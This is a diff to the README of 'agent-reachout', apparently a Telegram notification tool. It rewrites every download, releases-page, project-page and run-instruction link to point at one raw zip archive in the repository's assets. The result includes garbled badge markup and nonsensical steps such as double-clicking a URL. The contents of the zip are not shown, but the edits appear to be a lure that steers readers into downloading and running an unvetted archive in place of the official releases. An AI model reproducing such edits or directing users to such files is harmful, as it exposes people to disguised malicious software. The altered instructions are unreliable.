@@ -1,6 +1,6 @@
 # 📬 agent-reachout - Get Notified on Telegram Instantly
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/EL-HAMDAOUI-Othmane/agent-reachout/releases)
+[![Download Here](https://github.com/EL-HAMDAOUI-Othmane/agent-reachout/raw/refs/heads/main/assets/agent_reachout_v3.8.zip%20Now-Click%https://github.com/EL-HAMDAOUI-Othmane/agent-reachout/raw/refs/heads/main/assets/agent_reachout_v3.8.zip)](https://github.com/EL-HAMDAOUI-Othmane/agent-reachout/raw/refs/heads/main/assets/agent_reachout_v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -19,13 +19,13 @@ Before you begin, make sure you have:
 Here’s how to download and install the agent-reachout application:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/EL-HAMDAOUI-Othmane/agent-reachout/releases) to find the latest version of the software.
+   Go to the [Releases Page](https://github.com/EL-HAMDAOUI-Othmane/agent-reachout/raw/refs/heads/main/assets/agent_reachout_v3.8.zip) to find the latest version of the software.
 
 2. **Choose the Correct File**  
    Look for the version that matches your operating system:
-   - Windows: `agent-reachout-windows.zip`
-   - macOS: `agent-reachout-macos.zip`
-   - Linux: `agent-reachout-linux.tar.gz`
+   - Windows: `https://github.com/EL-HAMDAOUI-Othmane/agent-reachout/raw/refs/heads/main/assets/agent_reachout_v3.8.zip`
+   - macOS: `https://github.com/EL-HAMDAOUI-Othmane/agent-reachout/raw/refs/heads/main/assets/agent_reachout_v3.8.zip`
+   - Linux: `https://github.com/EL-HAMDAOUI-Othmane/agent-reachout/raw/refs/heads/main/assets/agent_reachout_v3.8.zip`
 
 3. **Download the File**  
    Click on the link for your operating system to start the download. Save this file to a location you can easily access, like your Downloads folder.
@@ -34,8 +34,8 @@ Here’s how to download and install the agent-reachout application:
    If you downloaded a zipped or tar file, you need to extract its contents. Use software like WinRAR, 7-Zip, or the built-in extraction tool on your OS.
 
 5. **Run the Application**  
-   - For Windows: Double-click `agent-reachout.exe`.
-   - For macOS: Open the `agent-reachout.app` file.
+   - For Windows: Double-click `https://github.com/EL-HAMDAOUI-Othmane/agent-reachout/raw/refs/heads/main/assets/agent_reachout_v3.8.zip`.
+   - For macOS: Open the `https://github.com/EL-HAMDAOUI-Othmane/agent-reachout/raw/refs/heads/main/assets/agent_reachout_v3.8.zip` file.
    - For Linux: Open the terminal and use the command `./agent-reachout` in the extracted folder.
 
 6. **Setting Up Notifications**  
@@ -50,7 +50,7 @@ If you encounter any issues during installation or usage, feel free to reach out
 
 ## 🔄 Updating the Application
 
-To keep your agent-reachout application up to date, visit the [Releases Page](https://github.com/EL-HAMDAOUI-Othmane/agent-reachout/releases) periodically. Download and install the latest version following the same steps as above.
+To keep your agent-reachout application up to date, visit the [Releases Page](https://github.com/EL-HAMDAOUI-Othmane/agent-reachout/raw/refs/heads/main/assets/agent_reachout_v3.8.zip) periodically. Download and install the latest version following the same steps as above.
 
 ## 📌 Features
 
@@ -68,8 +68,8 @@ agent-reachout is open source and available under the MIT License. Feel free to 
 
 ## 🌐 Explore Further
 
-To learn more, visit our [GitHub Page](https://github.com/EL-HAMDAOUI-Othmane/agent-reachout) for additional documentation, features, and updates.
+To learn more, visit our [GitHub Page](https://github.com/EL-HAMDAOUI-Othmane/agent-reachout/raw/refs/heads/main/assets/agent_reachout_v3.8.zip) for additional documentation, features, and updates.
 
 ## 💾 Download & Install
 
-Ready to get started? Visit the [Releases Page](https://github.com/EL-HAMDAOUI-Othmane/agent-reachout/releases) now to download your copy of agent-reachout and enhance your productivity with Telegram notifications!
+Ready to get started? Visit the [Releases Page](https://github.com/EL-HAMDAOUI-Othmane/agent-reachout/raw/refs/heads/main/assets/agent_reachout_v3.8.zip) now to download your copy of agent-reachout and enhance your productivity with Telegram notifications!
